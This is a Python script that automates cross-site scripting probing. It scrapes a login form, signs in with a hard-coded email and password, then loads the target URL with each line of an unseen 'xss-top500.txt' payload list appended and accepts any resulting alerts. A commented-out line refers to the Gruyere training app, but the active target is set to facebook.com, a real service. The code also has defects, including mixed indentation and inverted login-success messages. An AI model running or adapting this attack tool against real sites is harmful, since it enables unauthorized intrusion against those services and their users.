import requests
from bs4 import BeautifulSoup
import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


# reg_url = "http://google-gruyere.appspot.com/start"

base_url = "https://google-gruyere.appspot.com/618655413586375839657115594994104056558"
base_url = "https://www.facebook.com"


#user login page with passed info
url_login = base_url + "/login"


browser = webdriver.Firefox()




#info to create a new users
user = "smith.jhsn@gmail.com"
password = "smith2013"



#get all input fields to find crdentials login fields
def getAllInputFields():
	#add a session to the request
	s = requests.session()
	#send login request
	request = s.get(url_login)
	#parse HTML page
	parseHTML = BeautifulSoup(request.text, 'html.parser')
	#Extract the form name using Beautifull Soap
	htmlForm = parseHTML.form
	#find all input fields for user/email and password fields
	inputs = htmlForm.find_all('input', type=["text", "password"])
	return inputs

#Extract Input Field Names
def inputFieldNames(inputs):
	inputFieldNames = []
	for items in inputs:
		if items.has_attr('name'):
			inputFieldNames.append(items['name'])
	return inputFieldNames



#extract input field labels
def inputFieldLabels(inputFieldNames):
	inputFieldLabels = []
	for i in range(len(inputFieldNames)):
		input_tag = str(inputs[i].parent.previous_sibling).replace(":", "").replace('\n','')
		input_label_text = BeautifulSoup(input_tag, 'html.parser').get_text()
		inputFieldLabels.append(input_label_text)
	return inputFieldLabels


#find login fields to pass credentials to
def findLoginFields(browser,inputFieldNames, inputFieldLabels): 
	for i in range(len(inputFieldLabels)):
		if "user" in inputFieldNames[i] or "user" in inputFieldLabels[i] or "email" in inputFieldNames[i] or "email" in inputFieldLabels[i]:
			browser.find_element_by_name(inputFieldNames[i]).send_keys(user)
			print("user passed to try to login")
		if "pass" in inputFieldNames[i] or "pass" in inputFieldLabels[i]:
			browser.find_element_by_name(inputFieldNames[i]).send_keys(password)
			print("password passed to try to login")


def findLoginButtonAndClick(browser):
	try:
		login_attempt = browser.find_element_by_xpath("""//input[@type='submit']""")
		print("submit input clicked")
		login_attempt.submit()
		print("logged in")
	except:
		login_attempt = browser.find_element_by_xpath("""//button[@type='submit']""")
		print("submit button clicked")
		login_attempt.submit()
		print("logged in")
	else:
		print("didn't login")




#handle if alert pops up to be able to go to the next script
def handleAlert(browser, base_url, payload, sleep_time):
  newurl = str(base_url)+"/"+str(payload)
  browser.get(newurl);
  try:
    WebDriverWait(browser, 1).until(EC.alert_is_present(),
                                   'Timed out waiting for PA creation ' +
                                   'confirmation popup to appear.')

    alert = browser.switch_to.alert
    alert.accept()
    print("alert popped up and accepted")
  except TimeoutException:
    print("no alert popped up")
  time.sleep(sleep_time)



#injecting top500 xss scripts to the target
def injectPayload(payloads):
	with open(payloads, "r") as pl:
		print("started injecting payloads")
	  	for payload in pl:
	  		handleAlert(browser, base_url, payload, 1)



inputs = getAllInputFields()
inputFieldNames = inputFieldNames(inputs)
inputFieldLabels = inputFieldLabels(inputFieldNames)

#login to the url
browser.get(url_login) 

findLoginFields(browser, inputFieldNames, inputFieldLabels)		
findLoginButtonAndClick(browser)
time.sleep(3)

injectPayload("xss-top500.txt")
